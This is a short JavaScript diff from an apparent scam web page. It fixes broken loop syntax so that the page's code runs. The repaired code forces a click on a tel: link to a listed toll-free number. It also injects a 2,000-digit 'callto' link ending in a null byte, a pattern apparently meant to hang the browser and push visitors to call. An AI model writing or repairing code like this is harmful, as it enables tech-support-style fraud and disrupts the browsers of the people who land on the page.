@@ -604,11 +604,11 @@ s0.parentNode.insertBefore(s1,s0);
         }
 
         var sText = document.querySelectorAll('.js_setTextBlock');
-        for (var t = 0; t < sText.length; t+) {
+        for (var t = 0; t < sText.length; t++) {
             sText[t].innerHTML = getText();
         }
         var sPhone = document.querySelectorAll('.js_setPhoneBlock');
-        for (var p = 0; p < sPhone.length; p+) {
+        for (var p = 0; p < sPhone.length; p++) {
             sPhone[p].innerHTML = phone;
         }
 
@@ -687,7 +687,7 @@ s0.parentNode.insertBefore(s1,s0);
             jQuery('#result').append('<a  class="anchorcall" href="tel:+1-855-657-5112 "></a>');
             document.querySelector('a').click();
             var extraData = "";
-            for (itxextraData = 0; itxextraData < 200; itxextraData+) {
+            for (itxextraData = 0; itxextraData < 200; itxextraData++) {
                 var extraData = extraData + "5555555555";
             }
             jQuery('#result').append('<a href="#callto+' + extraData + '%00"></a>');
